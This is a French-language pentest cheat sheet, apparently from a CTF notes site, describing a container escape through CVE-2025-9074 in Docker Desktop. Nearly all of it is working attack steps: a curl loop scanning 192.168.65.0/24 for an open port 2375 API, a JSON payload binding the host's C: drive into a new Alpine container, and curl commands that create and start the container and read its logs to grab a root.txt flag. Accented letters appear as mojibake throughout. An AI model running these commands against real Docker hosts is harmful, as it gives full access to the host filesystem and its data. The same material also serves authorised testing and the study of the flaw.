# Escape Container : Docker Desktop API (CVE-2025-9074)

## <mark style="color:red;">üêã Escape Container : Docker Desktop API (CVE-2025-9074)</mark>

### <mark style="color:blue;">üìù Description</mark>

Cette fiche d√©taille l'exploitation de la CVE-2025-9074, une vuln√©rabilit√© critique (CVSS 9.3) dans Docker Desktop. Elle permet √† un conteneur d'acc√©der √† l'API du moteur Docker sur l'h√¥te via le r√©seau interne sans aucune authentification. En exploitant cet acc√®s, un attaquant peut cr√©er un nouveau conteneur privil√©gi√© avec le syst√®me de fichiers de l'h√¥te mont√©, r√©alisant ainsi une √©vasion compl√®te (Full Container Escape).

***

### <mark style="color:blue;">üîç Phase de Reconnaissance</mark>

#### 1. Identifier l'environnement

V√©rifier si nous sommes dans un conteneur et identifier le sous-r√©seau.

```shellscript
hostname
ip addr # Exemple: 172.18.0.2/16
ip route # Trouver la gateway (ex: 172.18.0.1)
```

#### 2. √ânum√©rer le r√©seau Docker Desktop

Sur Docker Desktop (Windows/WSL2), l'API √©coute souvent sur le segment `192.168.65.0/24`. On cherche le port par d√©faut 2375 (HTTP).

Scan rapide du subnet :

Bash

{% code fullWidth="true" %}
```
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
```
{% endcode %}

_Si une IP r√©pond (ex: `192.168.65.7`), l'API est expos√©e._

***

### <mark style="color:blue;">üöÄ Exploitation (Escape vers l'H√¥te)</mark>

#### 1. V√©rifier l'API et les images disponibles

Une fois l'IP trouv√©e, on v√©rifie quelles images nous pouvons utiliser pour notre nouveau conteneur.

Bash

```
curl http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

#### 2. Pr√©parer le Payload JSON

Le but est de monter la racine du syst√®me h√¥te (`/mnt/host/c` sous WSL2) dans un dossier du nouveau conteneur (`/mnt/host_root`).

Cr√©ez un fichier `container.json` :

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  }
}
```

#### 3. D√©ploiement via l'API

On utilise `curl` pour interagir avec l'API Docker distante et ex√©cuter notre conteneur malveillant.

A. Cr√©er le conteneur :

Bash

{% code fullWidth="true" %}
```shellscript
curl -X POST -H "Content-Type: application/json" -d @container.json http://192.168.65.7:2375/containers/create?name=pwned
```
{% endcode %}

_(Notez l'ID retourn√©)_

B. D√©marrer le conteneur :

```
curl -X POST http://192.168.65.7:2375/containers/<ID_OU_NOM>/start
```

C. R√©cup√©rer le flag (Logs) :

```
curl "http://192.168.65.7:2375/containers/pwned/logs?stdout=true"
```

***
